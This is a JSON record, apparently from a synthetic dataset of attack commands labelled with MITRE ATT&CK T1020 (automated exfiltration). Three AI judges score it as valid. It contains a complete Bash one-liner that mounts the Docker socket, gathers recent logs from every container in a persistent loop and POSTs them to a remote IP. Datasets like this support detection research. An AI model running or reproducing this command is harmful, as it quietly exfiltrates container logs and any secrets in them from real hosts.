@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "docker run -d --rm --name exfil_dockerlogs --network host -v /var/run/docker.sock:/var/run/docker.sock:ro docker:24-cli sh -c 'apk add --no-cache curl >/dev/null 2>&1; while true; do docker ps -q | xargs -r -I{} docker logs --since 30m {} 2>/dev/null | gzip -c | curl -s -X POST -H \"Content-Type: application/gzip\" --data-binary @- \"http://203.0.113.15:8080/dockerlogs?host=$(hostname)\"; sleep 1800; done'",
+  "explanation": "Uses docker socket access to periodically collect recent container logs and exfiltrate them via HTTP in a quiet, automated loop.",
+  "rationale_steps": [
+    "Mounts Docker socket to enumerate and read other containers' logs",
+    "Limits scope to last 30 minutes and compresses to reduce size",
+    "Uploads via curl in silent mode to a remote endpoint",
+    "Runs detached with repeated intervals for automation"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-3bfa6c8a-1d17c1d2",
+  "source_prompt_hash": "3bfa6c8a",
+  "timestamp_utc": "2025-09-30T09:14:36.595419Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Command is well-formed with balanced quoting, valid docker and shell flags, proper pipelines, and a correct sh -c loop.",
+        "semantic_score": 5,
+        "semantic_justification": "It launches a detached container that periodically gathers recent Docker logs via the Docker socket, compresses them, and exfiltrates via HTTP in an automated loop, aligning with Automated Exfiltration (T1020).",
+        "combined_score": 5.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T03:55:26.915749Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper semicolons and pipe separators, valid Docker and curl flags, and correct shell construct nesting within the single-quoted sh -c argument.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully realizes T1020 automated exfiltration: it mounts the Docker socket to enumerate running containers, collects logs from the past 30 minutes via 'docker logs --since 30m', compresses output with gzip, and POSTs it to an external HTTP endpoint with hostname identification, repeating every 1800 seconds in a persistent background container — matching batching, compression, scheduling, and automated transfer behaviors described in the technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-18T22:24:44.374397Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command follows correct Docker CLI and shell syntax, including proper quoting, pipe usage, and valid flag arguments for both Docker and curl.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly demonstrates automated exfiltration by using a persistent loop to collect container logs via the Docker socket, compressing them, and transmitting them to a remote server over HTTP.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-18T22:24:47.205953Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
